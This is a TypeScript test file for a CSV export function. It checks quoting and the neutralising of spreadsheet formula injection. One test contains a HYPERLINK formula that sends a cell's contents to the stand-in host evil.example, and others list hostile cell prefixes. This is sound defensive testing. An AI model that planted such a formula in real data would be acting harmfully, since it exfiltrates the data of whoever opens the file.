/**
 * CSV that a spreadsheet opens correctly, and cannot be made to execute.
 *
 * The formula tests are the ones with teeth. A cell beginning `=` is run by
 * Excel, Sheets and LibreOffice the moment the file is opened — so an invoice
 * note somebody typed into this hospital's admin panel becomes code on an
 * accountant's machine. It is a real and frequently-shipped vulnerability, and
 * it lives exactly where nobody looks: a "just export it" helper.
 */

import { describe, expect, it } from "vitest";

import { toCsv } from "@/lib/csv";

const body = (csv: string) => csv.split("\r\n").slice(1);

describe("shaping the document", () => {
  it("writes the header and one line per row", () => {
    const csv = toCsv(["a", "b"], [["1", "2"], ["3", "4"]]);
    expect(csv).toBe("a,b\r\n1,2\r\n3,4");
  });

  it("uses CRLF, which is what RFC 4180 and older Excel expect", () => {
    expect(toCsv(["a"], [["1"]])).toContain("\r\n");
  });

  it("writes empty cells for null and undefined rather than the words", () => {
    // "undefined" in a currency column is worse than a blank: it looks like data.
    expect(body(toCsv(["a", "b"], [[null, undefined]]))[0]).toBe(",");
  });
});

describe("quoting", () => {
  it("wraps a field containing a comma", () => {
    const [line] = body(toCsv(["note"], [["Paid at counter, receipt kept"]]));
    expect(line).toBe('"Paid at counter, receipt kept"');
  });

  it("doubles quotes inside a quoted field", () => {
    const [line] = body(toCsv(["note"], [['He said "later"']]));
    expect(line).toBe('"He said ""later"""');
  });

  it("wraps a field containing a newline", () => {
    const [line] = body(toCsv(["note"], [["line one\nline two"]]));
    expect(line).toBe('"line one\nline two"');
  });

  it("leaves an ordinary field alone", () => {
    expect(body(toCsv(["n"], [["INV-2026-000031"]]))[0]).toBe("INV-2026-000031");
  });
});

describe("formula injection", () => {
  it.each(["=1+1", "+1", "-1+1", "@SUM(A1)", "\tcmd", "\rcmd"])(
    "neutralises a cell starting with %j",
    (dangerous) => {
      const [line] = body(toCsv(["note"], [[dangerous]]));
      // The apostrophe makes the spreadsheet treat it as text. It is not
      // displayed in the cell, so nothing is lost to the reader.
      expect(line.replace(/^"|"$/g, "").startsWith("'")).toBe(true);
    },
  );

  it("stops the classic one", () => {
    const attack = '=HYPERLINK("http://evil.example/?x="&A1,"Click")';
    const [line] = body(toCsv(["note"], [[attack]]));
    expect(line.startsWith('"\'=HYPERLINK')).toBe(true);
  });

  it("keeps what the character meant, rather than stripping it", () => {
    // A negative amount is still readable as a negative amount.
    const [line] = body(toCsv(["amount"], [["-250.00"]]));
    expect(line).toContain("-250.00");
  });

  it("leaves a safe cell unprefixed", () => {
    expect(body(toCsv(["a"], [["250.00"]]))[0]).toBe("250.00");
  });
});
